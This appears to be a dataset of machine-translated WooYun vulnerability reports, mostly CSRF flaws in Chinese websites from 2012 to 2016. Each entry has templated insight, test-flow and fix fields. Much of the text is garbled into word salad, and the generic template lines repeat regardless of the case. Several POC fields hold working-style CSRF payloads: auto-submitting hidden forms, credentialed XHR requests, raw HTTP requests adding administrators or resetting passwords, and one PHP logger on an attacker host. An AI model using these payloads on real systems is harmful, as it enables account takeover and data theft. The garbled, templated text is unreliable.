**Details**: textsendtextagainlook atunder,foundsohuallsitealltextcopynoforcsrftranslated textlocationhandle....againsendone times,textoneunderyou.textItextwooyuntext,onevulnerabilitytextgoodafter,onetextwillintextlook atlook athasnosametexthas.againtranslated textone,passportcsrf.passporttranslated textIthennottext.heretextmodifyusertranslated textnamedtranslated text,pageontext,translated textisrecoveraccounttextonetext... this timesuseGET,referercheckalltext.textnotneeduserclick,openemail/textdirectlyintext.textoneseriousvulnerabilityis,inpageon,translated textonetextthenagaincannotmodify,canisIcsrftranslated text...thatrestrictiondirectlynotext.exploittextcantext.thiscsrfsendtextIthennotagainsendlook atyoutext,yougoodgoodtextcode,Itranslated textaddtextnot...textonetext,emailonlyisIexploitonetext,itstext,nottextisa certain social platformtextisblogtextisforum,allcantextasexploittext.

**POC**: Itextisasselftext,itstextuse<img src>directlytext.

**Bypass**: Direct exploitation

**Fix**: textreferenceWIKI
---

---
### [wooyun-2013-040832] Xizi ForumCSRFsendtext~
**Vendor**: bbs.xizi.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: url:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-036146] translated textlocationcsrf vulnerability
**Vendor**: baozoumanhua.com | **Year**: 2013 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: wepointIDundertextlargetextwetextunder..baozoumanhua.com/articles/4573284/dnthistextIDis:4573284  IEaddresstexthas

**POC**: wepointIDundertextlargetextwetextunder..baozoumanhua.com/articles/4573284/dnthistextIDis:4573284  IEaddresstexthas

**Bypass**: Direct exploitation

**Fix**: translated textFixthen can .bemalicioustextsendtotranslated textoneunder,Ithendo not know... youthencancantranslated text.textgoodtext~
---

---
### [wooyun-2013-026622] a certain social platforma certain social platformfollowCSRF
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: APIappeartext:https://example.com/[redacted] referertext,onlyhasucontentasa certain social platformid,good,testoneunder.

**POC**: <form method='post' action='https://example.com/[redacted]'><input type='text' value='1981622273' name='u' style='display:none!important;display:block;width=0;height=0' /></form><script>document.forms[0].submit();</script>pagesave uvalueasa certain social platformid textfollowtextclouda certain social platform.

**Bypass**: Direct exploitation

**Fix**: validation validation
---

---
### [wooyun-2014-055519] Renrenoftextuseinheartcsrf #4
**Vendor**: Renren | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: intranslated textputplatformnotexttokencausebecsrfattackobjecttextlocationno tokenhttps://example.com/[redacted]

**POC**: intranslated textputplatformnotexttokencausebecsrfattackobjecttextlocationno tokenhttps://example.com/[redacted]

**Bypass**: filterBypass

**Fix**: Token ,andtextcheckundersubsitewhetherhassametextissue!
---

---
### [wooyun-2015-0103642] text800one locationone issueCSRF
**Vendor**: text800 | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issueappearinshipping addresshttps://example.com/[redacted] method="POST" name="form0" action="https://example.com/[redacted]"><input type="hidden" name="receiverName" value="111"/><input type="hidden" name="mobile" value="13800138000"/><input type="hidden" name="email" value=""/><input type="hidden" name="telCode" value=""/><input type="hidden

**POC**: itstextcanfoundIformtextpostcodenotisontextnext400000,istextone.thattextuse519100thiscodewhethercantexttowetargettext?textwelook atlook atcanlook attotextpagetext,thattextweagainlook atlook atshipping addresshasnoaddcanlook attopagetext,butaddresstextadd.textweagainputcodevaluetext400000look atlook atcanlook attoisthis way,thattexttoshipping addresslook atlook atadd.

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2012-08579] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="content" value="XXXXXXXXXXXXX" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></form><script

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2014-050389] ThinkSNSmultiple locationsGETtypeCSRF(package)
**Vendor**: ThinkSNS | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thentextyoutextsitetexttest(isT3latest versioncopy)https://example.com/[redacted]

**POC**: 1)changepersonalsetinprivacyset(throughGETrequesttext)https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: itstexthastext,Ithennotalltextsendoncome.sotextoperationonetranslated textPOSTandGET.
---

---
### [wooyun-2013-027684] a certain social platformblogcsrfvulnerability--translated text
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textiftext:copycomenottextsubmit,butIselftextnotontext(textdo not knowtranslated text),asIblog(textisusecometext)cantextlog in,nottextnotsubmittranslated text:a certain social platformblog,textimagedirectlyinputhttps://example.com/[redacted]

**POC**: look atlook atthisaddress:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: translated text
---

---
### [wooyun-2015-0117289] UIintexta certain functional design flaw causescross-siterequest forgery(CSRF)#3
**Vendor**: ui.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: UIintextfollowfunctional design flaw causescross-siterequest forgery(CSRF)#3

**POC**: poc:<html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF  POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="act" value="follow"/><input type="hidden" name="ct" value="add"/><input type="hidden" name="followid"

**Bypass**: Direct exploitation

**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-0160261] a certain social platforma certain social platformCSRFofpointIlinkthenwillfollow
**Vendor**: a certain social platforma certain social platform | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issuepage:https://example.com/[redacted]

**POC**: hereweusetext@gainoverina certain social platformontext@textnottranslated textwhentext @Iistranslated textenterlineprove.Itextnumber:canlook attotextfollownumberis37personal.textquestiontestpage:https://example.com/[redacted] action="https://example.com/[redacted]" method="post"><input type="text" name="uid" value="5787593657" />

**Bypass**: filterBypass

**Fix**: Fixreferrervalidation
---

---
### [wooyun-2015-093157] CSRFstealaccounttextaccountsecurity
**Vendor**: 100bt.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textemailbindandpasswordtextissuetextallonlyisvalidationusertextnumbercode,translated textnumbercodeistext,as shown belowso,Ifollowersparsecomelook atunderbindemailandtextpasswordtextissuerequesttextdata

**POC**: Iinlocaltextone csrfpage,foroneaccountenterlinetesttextheretextnopasswordtextissuethenas followscode,localapacheenvironmentruntextsuccesslook attocanusepasswordissue

**Bypass**: Direct exploitation

**Fix**: needaddtextonehashvalue,cannotistextvalue,forforsubmitted datatextverify,textdatawhetheristranslated textpagerequestsubmit.
---

---
### [wooyun-2015-0130716] a certain textcompanytextundera certain sitehascsrftextshipping addresscan modify
**Vendor**: a certain textcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain textcompanytextundera certain e-commercewebsitemodifyshipping addresslocationhascsrfhttps://example.com/[redacted]"POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("receiverAdd.receiverName=woo126a certain IM software&receiverAdd.mobile=13611111111&receiverAdd.detailAddress=fwagrfagrasgre&recei

**POC**: useprove

**Bypass**: Direct exploitation

**Fix**: addtokenvalidationreferer
---

---
### [wooyun-2016-0170272] pointIlinkIthencancanwillentertexta certain music app
**Vendor**: a certain Internet company | **Year**: 2016 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface, admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain music appinterfacealluseTokencometextCSRF,thentextpasswordonetext,intexta certain social platformbindinterfacein,textuseunderseveraltranslated text1. userclickbindtext,textadmin backendsendtogetherbindrequest,GET /api/sns/authorize2. 302toa certain social platformtextpage:https://example.com/[redacted] usertranslated text,texttohttps://example.com/[redacted] Tokenissuethentextintextafteronetextin,textNo.twotextParametersintextonstateParameters,buttextvalidationthisParametersseemsnogoodgooduseon,textthisParametersforfora certain social platforma certain social platformAPIcometextnotistext,textuseoneundera certain social platformtext:usefortextrequestandtextstatus,intranslated text,willinQuery ParameterintextthisParameters.developercanusethisParametersvalidationrequesthastext,textcantextuserrequesttranslated text.thisParameterscanusefortextcross-siterequest forgery(CSRF)text

**POC**: testcode,pipinstalloneunderrequests, BeautifuSoup, Flask,textoneunderundertexta certain social platformaccountandpassword(textneedtranslated text),thentextquestiononeunderthen can:# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_form = u'''<form action="https://example.com/[redacted]" method="post"><input type="te

**Bypass**: Direct exploitation

**Fix**: youshouldtextItext
---

---
### [wooyun-2015-0131903] translated texta certain sitearbitraryshipping addressresetvulnerability(CSRF)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] novalidationgoodweconstructpocwelog inaccount2 enterlinetextquestionwetextquestioncsrfthatfilelook atalreadysuccess

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addtokenvalidation
---

---
### [wooyun-2015-0155773] translated textP2Psystemlarge amount ofCSRF+notextvalidationcodetextattack(Demotext)
**Vendor**: lvmaque.com | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: No.(1) people:textattackvulnerability:textinsidetotextagaintoadmin backendvulnerability,textfront endtextattackcometext!texttest,log inpasswordtextuseaftervalidationcodeisnotext,pagetextnobetext.textinItextBURPtruncationcometextoneunderpassword,hereto demonstrateIthentranslated textoneunderthenline,provevalidationcodeinputone timesuseafteris onetextcantext,becauseadmin backendaccountandpasswordisofficialhastext,usetranslated textcomeallistextadmin backendmodifytextpasswordcome!thisis onelog inrequestpacket,textinIthentranslated textpassword,hereisaccountandpasswordiscanonetogethertext,completelyisnotextrestriction!return1:truethatthenistextpasswordthenistext(insidetranslated textpasswordisItextinput,to demonstrateoneunder)look at,otherpackettextallis0:false.textinweputpacketsendtextgo back,thentextoneunderpagecanlook atto

**Bypass**: Direct exploitation

**Fix**: addtokenoftextvalidation,textattackifcanrestrictiononeunderlog intext timesnumberorlog intextaftertranslated textvalidationcode.
---

---
### [wooyun-2014-081739] translated textone locationCSRFcansetusertextpassword
**Vendor**: a certain imagewebsite | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textaccountinformation->passwordmodifylocation,fornotsettranslated textpassworduser,hasCSRF,canbemalicioussettextpasswordhttps://example.com/[redacted]

**POC**: POC:<form name="csrf" action="https://example.com/[redacted]" method="POST"><input type=text name="sellPwd" value="abcdef1!"></input><input type=text name="sellPwdConfirm" value="abcdef1!"></input><input type="submit" value="submit" /></form><script>document.csrf.submit();</script>

**Bypass**: Direct exploitation

**Fix**: token,validationcode
---

---
### [wooyun-2012-08529] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="content" value="XX" /><input type="submit" value="submit" /></form><script>document.imlongha

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2015-0110465] sametranslated textundertextplatformtextuserinformation,translated textcancausingtextdatabase
**Vendor**: a certain textcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textmain siteoncanlook attosametextunderkey pointtextthreewebsiteinmain sitely.comundertranslated textnothasthisissue,text17u.nettextcansendtextfuzzingtextinly.comundertranslated textuser,in17u.netundertextlog inorin17u.netundertranslated text,inly.comundertextlog inIthennotscreenshot.thisis100%can.becausetwotextIalltext.packettextin17u.comundertextiscanlog in.thattextfuzzingsendtextintextinsidetext?thenisin17u.netundertranslated textfuzzingusernamedin17u.netundertranslated textwhenifmobile phonenumbercodealreadyhas,willhasthis waytextif nothas,willhasthis waytextcapture packetscanlook atto,hastextreturnstatus:200nothastextreturnstatus:100thatthroughthisstatus,we

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-059117] a certain e-commerce platformclienttextQR codelog intextcanenterlineaccounthijack
**Vendor**: a certain e-commerce platform | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text:a certain e-commerce platformQR codepage:https://example.com/[redacted])securityIdtextiscometranslated textQR codetextstatus;textbarcodeisQR codeintranslated text,textmobile phoneclienttextuse.textinterface:https://example.com/[redacted]

**POC**: textsimulation:whentextbrowserlog ina certain e-commerce platformtextunder,as follows:textlook attooneNo.threetextsiteQR codeas follows:ifwebsiteonhasonesomedeceptivetext,texta certain e-commerce platformclienttranslated textred packet,textortextusea certain e-commerce platformtranslated text,translated textcodecantextoftextsocial engineeringcometranslated textusea certain e-commerce platformclienttextQR code.itstext,attackerthattextcancanhasonepageonetextinetc.translated textontext:onetranslated text,thenattackerbrowserinsidethenlog intexta certain e-commerce platform,as follows:translated text:1.victimtextafterwillfoundmobile phoneontextlog inpage,butthistextattackeralreadytexttotranslated text;2.victimbrowsera certain e-commerce platformlog inuserandmobile phoneontextonetext,onetextallonlyhasonea certain e-commerce platformaccount.

**Bypass**: Direct exploitation

**Fix**: textlog ininterfacetextundercsrftext.
---

---
### [wooyun-2014-078286] UCenterhasmultiple locationsCSRF(canbackupdata,deletetextuse,deleteadministratoretc.)
**Vendor**: Discuz! | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: UCenterhastextmultiple locationsnotextformhash......allcanCSRF......

**POC**: #1 deletetextuseformhashastext,successsubmit#2 deleteadministratorformhashastext,successdelete#3 backupdatanoformhash,directorynamedcantextifiswindowsuser,textcopyonthencantextnext......

**Bypass**: Direct exploitation

**Fix**: translated textformhashwindowsshortfilenamedtranslated text:1.translated textistextstorefilenamedtext(textnotisputalltextalltextusewintextuser),textusewindowsserverusertextnottextnumber.windowsfilenamedlargefor8 peopletextthencanusetextshortfilenamedtextquestionto.becauseshortfilenamedtext6 peopletextadd"~numbertext",thattextwhynottextfilenamed
---

---
### [wooyun-2014-054888] Tianya--a certain social platformOAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: Tianyacommunity | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text:Tianya-a certain social platform OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartoneTianya-a certain social platformOAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationrequestreturn.https://example.com/[redacted] Tianyatextwilltextputuseraccount

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-011556] translated textsettextcausingCSRFtext
**Vendor**: translated text | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: tolocationisCSRF.https://example.com/[redacted] follow/add follow+message....

**POC**: var request = false;if(window.XMLHttpRequest) {request = new XMLHttpRequest();if(request.overrideMimeType) {request.overrideMimeType('text/xml');}} else if(window.ActiveXObject) {var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP','Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxm

**Bypass**: Direct exploitation

**Fix**: formkey andReferervalidation canandsameline(zhihu.com)textundertext,translated textnottext~ ortranslated textI.
---

---
### [wooyun-2015-0109337] a certain translated textcan modifytranslated textcopytext(csrfone)
**Vendor**: fruitday.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: cantextheartconstructform <img src=>etc.etc. sendtranslated textthentrigger

**POC**: as abovetext

**Bypass**: Direct exploitation

**Fix**: addtoken validationsourcetext
---

---
### [wooyun-2012-05038] KaixintextincollectvulnerabilitycancausingusertextcollectIinformation
**Vendor**: kaixin001.com | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: No.onetext putposttext GETrequestNo.twotext exploitdiaryetc.translated textfunctionalityputGETrequesttexttoarticlein

**POC**: No.onetext putposttext GETrequesthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addtextPOSTtext
---

---
### [wooyun-2015-0130911] a certain translated texta certain admin backendlog inpagehasCSRFcausingcanresetadministratorpassword
**Vendor**: fruitday.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: POST /model/edituser.php?id=3 HTTP/1.1Content-Length: 37Pragma: no-cacheCache-Control: no-cacheReferer: https://example.com/[redacted] enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsCookie: PHPSESSID=vuem5apdi7g7g

**Bypass**: Direct exploitation

**Fix**: textinterfaceenterlinecsrfvalidation
---

---
### [wooyun-2014-068440] FengCMSCSRF vulnerabilitycancausingdatadatabasebedump
**Vendor**: fengcms.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: admin backendmanagementindatabackupfunctionalitynotenterlinecsrf tokenvalidation.attackercreatecontentas followscsrf.phpandputtoattacker.comundertext:<?phpfile_put_contents("test.txt",  " IP:".$_SERVER["REMOTE_ADDR"], FILE_APPEND);file_put_contents("test.txt",  " Time:".date("Y.m.d H:i:s"),FILE_APPEND);?><img src="https://example.com/[redacted]">textafterputhttps://example.com/[redacted]

**POC**: attackersuccessgetbackupdatadatabasepath,andenterlinedownload:

**Bypass**: Direct exploitation

**Fix**: 1.backupfilenamedcantranslated text.recommendusetranslated textfilenamed
---

---
### [wooyun-2014-075925] ecshoplatest versioncsrf downloaddatadatabase
**Vendor**: ShopEx | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: test version,text2.7.4 beta1 text2.7.3allversiontextallnotokennotranslated text.textgoodtextVendorvulnerabilitytext,translated textlook attohastranslated text.backupdatadatabasefunctionality.requestas follows:hasonetokenfield,buttextastext,servicetextnocheckthisfield,directlyastextthencanrequestsuccess.sametext,Vendoradoptusereferermethodcomedefensecsrf,onlytextastextthencanBypass.cantextisthis kind ofdefenseisnoeffect.constructgoodexp,administratorclickafter,inwebdirectorytextusercantextfilenamedsqlfile.candirectlydownload.

**POC**: (see original)

**Bypass**: filterBypass

**Fix**: textshouldtextonecsrfdefenseBypassvulnerability,nottext peoplefunctionalitypointallcantextone...
---

---
### [wooyun-2013-022998] a certain forumsystem textfollow,followers
**Vendor**: a certain forumsystem | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain forumsystem 9.0follow/add follow boost followers..directlymodifyuid aftertextParametersthen can..http://[IP redacted]

**POC**: a certain forumsystem 9.0follow/add follow boost followers..directlymodifyuid aftertextParametersthen can..http://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0125679] translated textAndroid client textdeletetextshipping address
**Vendor**: translated text | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: deleteshipping address,andcapture packetstexthastokenvalue,texttest,foundtextistextvalue,textasdecoration.constructcsrflink(textidthen can)xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("appcode=android&id=943&r=%2Faddress%2Fdelete&token=45ea04c221bceff4190afe03d5cd5103");textquestionlinkdeleteaddresssuccess,textshipping address,validation.

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-0162481] pointIlinkIthencancanwillentertranslated textaccount
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textcommunitybinda certain social platformlog inrequestashttps://example.com/[redacted]

**POC**: textrecorded videohttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addcsrfprotectiona certain social platformbindtextusea certain social platformusernamedpasswordlog in
---

---
### [wooyun-2013-027425] textsingletextone locationGETtypecsrfcantextsendlargetextworm
**Vendor**: imaidan.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textsingletextsendtranslated textlocationno tokentextrequestasPOST,textGETtextcan,impacttranslated textoneetc.text.POC:https://example.com/[redacted]"testcsrf"text,ifinthistranslated textin,textpackettextuseonPOC,putwilltextsendlargetextworm.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textoperationonetextusePOSTtextoperationonetextaddtokentextoperationtextgoodtextaddRefererrestriction
---

---
### [wooyun-2013-035940] a certain social platformtextCSRFwormputlargeimpact
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: one<from>translated textsendtext.

**POC**: wetexta certain social platformbloghasonetextfunctionality:wecometextitsinone,textblog.constructas followsHTMLpublishtobloghomepagetranslated textcomponentinside.<form name="IjaxForm" action="https://example.com/[redacted]" method="post" target="loadingIframe_thread3561"><input type="hidden" name="version" value="7"><input type="hidden" name="blogId" value=

**Bypass**: Direct exploitation

**Fix**: translated text,rewardyou know what to do...
---

---
### [wooyun-2015-098776] textitemssystemcsrfaddadministrator
**Vendor**: text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: canthroughthiscsrftoadministrator privileges

**POC**: POST /dao/www/index.php?m=user&f=create&dept=0 HTTP/1.1Host: [IP redacted]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2013-026269] a certain social platformcsrfcanconstructworm
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textist.hk.some-domain.com1.directlypublishonetexta certain social platformandcapture packetsgetas followsdata;POST /index.php/index/t/add HTTP/1.1Host: t.hk.some-domain.comProxy-Connection: keep-aliveContent-Length: 776Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: https://example.com/[redacted] multipart/form-data; boundary=----WebKitFormBoundarydAxCJafTU9L2NcZDReferer: https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2013-041221] togetherpointpersonalinheartfollowcsrfvulnerability
**Vendor**: Shanda Network | **Year**: 2013 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: followthenoneaddfollowfunction,textsingleuseridandusernamedpostdatatranslated textsingle

**POC**: <html><body><form name="addfollow" action="https://example.com/[redacted]" method="post"><input name="ajaxMethod" value="addfollow" /><input name="followingId" value="2263635" /></form><script>document.addfollow.submit();</script></body></html>Ifollow:openpocpage:exploitsuccess:

**Bypass**: Direct exploitation

**Fix**: token,refereretc.etc.etc.etc.
---

---
